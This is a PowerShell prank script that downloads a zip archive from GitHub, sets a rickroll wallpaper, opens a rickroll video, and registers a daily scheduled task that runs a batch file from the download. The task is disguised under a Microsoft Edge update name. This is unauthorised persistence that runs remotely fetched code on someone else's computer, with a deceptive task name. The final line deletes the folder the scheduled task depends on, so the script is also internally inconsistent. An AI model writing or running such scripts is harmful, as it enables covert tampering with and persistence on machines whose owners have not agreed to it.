mkdir C:\temp
   
Invoke-WebRequest 'https://github.com/CHONK12/rickRoll/archive/refs/heads/main.zip' -OutFile C:\temp\rick.zip
Expand-Archive C:\temp\rick.zip C:\temp\rick
   

$MyWallpaper="C:\temp\rick\rickroll.jpg"
$code = @'
using System.Runtime.InteropServices;
namespace Win32{

    public class Wallpaper{
        [DllImport("user32.dll", CharSet=CharSet.Auto)]
        static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ;

        public static void SetWallpaper(string thePath){
            SystemParametersInfo(20,0,thePath,3);
        }
    }
}
'@





add-type $code
[Win32.Wallpaper]::SetWallpaper($MyWallpaper)
$action = New-ScheduledTaskAction -Execute 'C:\temp\rick\lobster.bat'  
$trigger = New-ScheduledTaskTrigger -Daily -At 3pm
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "MicrosoftEdgeUpdateTaskMachineCore{32533}" -Description "Ear death"
Start-Process msedge https://www.yout-ube.com/watch?v=dQw4w9WgXcQ

Remove-Item C:\temp
